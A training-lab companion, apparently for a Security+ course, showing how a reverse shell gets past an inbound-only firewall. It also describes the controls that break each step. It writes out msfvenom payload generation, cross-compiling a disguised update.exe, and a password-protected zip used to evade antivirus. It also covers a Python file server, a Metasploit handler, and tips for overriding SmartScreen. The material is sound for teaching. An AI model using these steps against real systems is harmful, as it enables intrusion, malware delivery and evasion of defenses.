Social Engineering Attack

The firewall blocks every inbound connection to the intranet — so the attacker never tries one. Instead a person inside is tricked into running a file that dials out. This companion walks the whole chain, explains each command, and shows how a defender breaks it at every link.

📋 Overview

What this lab is really teaching, and the network it happens on.

On paper this lab is a hacking exercise. The point it's actually making is a defensive one: a perimeter firewall only controls the direction of the first packet. The intranet machine (WinOS, 192.168.0.50) sits behind a pfSense firewall that silently drops anything arriving from the internet. The attacker on Kali (203.0.113.2) can't reach it — a ping just times out. So the attacker doesn't attack the firewall. They email a person inside and let that person launch a program that opens a connection outward, which the firewall happily allows. That outbound connection becomes the attacker's way in.

[THE ONE IDEA] If you remember one thing: egress (outbound) traffic is a security boundary too. A reverse shell is the whole reason "we have a firewall" is not the same as "we are safe."

The chain in four moves

  1. Build a Windows payload with msfvenom, embed it in a C++ program, cross-compile to update.exe, and hide it in a password-protected zip so the download scanner can't read it.
  2. Lure — from a compromised mail account, send a convincing "please update your software" email with a link to the file.
  3. Listen — start a Metasploit handler on Kali, waiting for the shell to call home.
  4. Land — the victim runs the file; a session opens on Kali with a foothold inside the intranet.

Task 1

Build Malicious Windows Executables to Attack a Remote System

Task 1.1

Build Malicious Windows Executable

1 Launch the Kali virtual machine to access the graphical login screen.

2 Log in as kali with kali as the password.

3 Click on the terminal icon located in the top menu bar.

4 In the Terminal window, type the command cd Documents, then press Enter to go to the folder where our partial malicious executable is saved.

5 While inside the Documents directory, run the command cat main.cpp to check the content of our malicious file.

📸Screenshot for your report: Payload built. The msfvenom output showing the shellcode and its byte count.
[NOTE] Notice the two spots in the code, we will be filling them later, based on the payload we created. the highlighted box is what the user sees when the program is running.

6 We will use msfvenom to generate our payload. Type the command below:

kali@kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=203.0.113.2 LPORT=4444 -f c

7 Note the number 460 shown in the output. Then, drag the mouse cursor to highlight the quoted area (the highlighted payload content), and press Ctrl + Shift + C to copy the payload.

8 Type sudo nano -l main.cpp to edit the code. When prompted for the password, enter kali.

9 In the new window, use the arrow keys to move the cursor to line 5, then press Ctrl + Shift + V to paste the payload. Check the number shown; make sure it is the same number as we saw in step 6.

10 Press Ctrl + S to save the file, then Ctrl + X to exit.

11 Because this is a C++ program, we will have to compile it. Type the command below to compile the main.cpp. The compiled Windows executable will be saved as update.exe.

kali@kali$ x86_64-w64-mingw32-g++ main.cpp -o update.exe

12 We will then compress update.exe to a zip file and password encrypt it so that the Windows defender will not delete it after the download. Type the following command; when prompted for the password, enter xyzsecurity and type the same password again to very it.

kali@kali$ zip -e update.zip update.exe

13 The malicious executable is made. Let's host it in our convenient Python server. Type the command python3 -m http.server to start the server.

14 Leave the window open and continue to the next step.

Task 1.3

Prepare and Listen to the Reverse Shell

1 Switch to the failed ping Terminal window. Type msfconsole to start the Metasploit framework.

2 In your Metasploit console, type the command below to use a handler.

msf6> use exploit/multi/handler
📸Screenshot for your report: Listener up. The handler reporting "Started reverse TCP handler."

3 Notice from the last step, it prompted that the payload is defaulting to generic/shell_reverse_tcp; this payload will not handle our 64-bit windows reverse shell, so let's change it by entering the following command and pressing Enter. msf6 exploit(multi/handler)> set payload windows/x64/shell_reverse_tcp

4 Now let's check the available options. Notice the payload is correct now, but we still need to change the LHOST.

5 Type the following command to change the LHOST. msf6 exploit(multiple/handler)> set LHOST 203.0.113.2

[NOTE] You can use setg LHOST local.ip.address.here to save the time on configuring the LHOST addresses. The setg will set the LHOST as a global variable. So, when it's set, every module payload that accepts LHOST will refer to the same entry.

6 We will now run the handler to wait for a reverse connection. Run the command exploit and leave the Terminal window open.

⚠️ Where students get stuck

The handful of places this lab quietly fails — and how to tell which one bit you.

[BYTE COUNT MISMATCH] The number on line 5's length field must equal the byte count msfvenom printed (e.g. 460). If they disagree, the EXE builds fine but the shell never comes back. Re-check this first whenever "nothing happens."
[WRONG PAYLOAD ON THE HANDLER] The handler defaults to generic/shell_reverse_tcp, a 32-bit catcher that can't handle your 64-bit payload. You must set payload windows/x64/shell_reverse_tcp explicitly. A connection that opens and instantly dies is the tell.
[COPY/PASTE IN THE TERMINAL] It's Ctrl+Shift+C and Ctrl+Shift+V in a Linux terminal, not plain Ctrl+C/V (plain Ctrl+C sends an interrupt). Pasting into nano can also mangle long lines — paste exactly on line 5.
[LHOST / LPORT DON'T AGREE] The payload's LHOST/LPORT (set at build time) and the handler's must be identical. Mix up the Kali address or the port and the shell dials a number nobody's answering.
[THE ZIP PASSWORD] Extraction needs xyzsecurity. If Defender deleted the EXE, you almost certainly skipped the -e (encrypt) flag when zipping — the plain EXE gets scanned and quarantined on download.
[CLICKING THROUGH THE WARNINGS] The browser's "can't be downloaded securely" and Defender's SmartScreen prompt both try to stop you. You have to choose Keep anyway / Run. If the file never executes, you probably dismissed one of these instead of overriding it.

🛡️ The defender's view

This is a defensive course, so run the attack backwards: every step above is a control that was missing. Here's what stops each one — and which Security+ ideas each control belongs to.

Egress filtering

Breaks: the reverse shell (Phase 3–4)

The single highest-value control here. If the firewall restricts outbound traffic to known services, a host dialing out to 203.0.113.2:4444 is blocked and logged. Perimeter rules that only filter inbound leave this door wide open.

Email security gateway

Breaks: the lure (Phase 2)

Attachment/link detonation, blocking password-protected archives, and an external-sender banner all intercept the message. The encrypted zip that fooled the download scanner is itself a red flag a mail gateway can quarantine.

Security awareness training

Breaks: the human (Phase 2 & 4)

The whole attack depends on one person running an emailed "update." Users who recognize the lure, distrust unsolicited software, and report it short-circuit the chain before any control is tested.

Application allow-listing

Breaks: execution (Phase 4)

If only approved, signed software can run, update.exe never executes — regardless of how convincing the email was or whether the user clicked through SmartScreen.

EDR & SmartScreen

Breaks: execution / post-exploitation

The Defender warnings the lab overrides are real signals. Endpoint detection flags an unsigned binary spawning a network shell; left enabled and enforced, it blocks or alerts rather than asking the user to decide.

Protect the mail account

Breaks: the launch point (Phase 2)

The attack starts from a compromised internal account. MFA, a real password policy, and impossible-travel alerting keep that account out of an attacker's hands in the first place — the lab's own intro hints at this.

[DEFENSE IN DEPTH] Notice no single control is the answer — each one breaks a different link. That layering is the Security+ lesson: assume any one control can fail and make sure another is behind it.

⚡ Cheat sheet

The whole chain and its defenses on one screen.

The attack chain

  • msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f c
  • Paste bytes + match length in main.cpp
  • x86_64-w64-mingw32-g++ main.cpp -o update.exe
  • zip -e update.zip update.exe
  • python3 -m http.server
  • Email lure → link to the zip
  • use exploit/multi/handler → set payload windows/x64/shell_reverse_tcp → set LHOST → exploit
  • Victim runs it → session → whoami, ipconfig

What stops it

  • Egress filtering (kills the reverse shell)
  • Email gateway + block encrypted archives
  • Security awareness training
  • Application allow-listing
  • EDR / SmartScreen left enforced
  • MFA + password policy on mail
  • Defense in depth — layer them

Know the terms

  • Reverse shell — target dials out to attacker
  • Payload — the code that runs on the target
  • Handler — listener that catches the shell
  • LHOST/LPORT — where/what the shell calls home
  • Cross-compile — build Windows binary on Linux
  • Egress — outbound traffic

✅ Check yourself

Four questions in the style the exam asks them. Answer in your head, then reveal.

1. The firewall blocks all inbound traffic to the intranet, yet the attacker gets a shell on a machine there. How?

The victim runs a program that opens an outbound connection to the attacker (a reverse shell). The firewall controls the direction of the first packet; it permits internal hosts to initiate connections out, so the shell rides that allowance. Inbound rules never come into play.

2. Why is the executable placed inside a password-protected zip before it's delivered?

Encryption hides the contents from download/antivirus scanners, which can't inspect what they can't decrypt, so the EXE isn't flagged or deleted on arrival. The social-engineering email supplies the password so the victim does the extraction themselves.

3. Name the single most effective network control against this attack, and say why.

Egress (outbound) filtering. The entire compromise depends on the victim host reaching out to the attacker on an arbitrary port; restricting outbound traffic to known-good destinations blocks and logs that call home, collapsing the chain even after the user runs the file.

4. The lab says the attack begins from a "compromised email account." Which controls would have protected that account, and which Security+ domain do they belong to?

MFA, a strong password policy, and anomalous-login/impossible-travel alerting — identity and access management controls (Domain 4, Security Operations, and the identity material in Module 10). They stop the attacker from ever having a trusted inside account to send from.
